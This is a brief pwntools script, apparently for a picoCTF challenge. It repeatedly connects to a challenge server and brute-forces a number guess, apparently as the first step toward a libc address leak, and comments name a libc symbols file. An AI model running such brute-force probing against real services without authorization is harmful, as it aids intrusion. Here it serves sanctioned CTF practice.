#!/usr/bin/python3

from pwn import *
import sys

# rand = 30fe0
# libc6-i386_2.27-3ubuntu1.2_amd64.symbols

for i in range(-28, -0x1000, -1):
    r = remote('jupiter.challenges.picoctf.org', 15815)
    r.sendlineafter('What number would you like to guess?\n', str(i))
    a = r.recvline()

    if b'Nope!' not in a:
        print(a)
        break
    print(i)
    r.close()
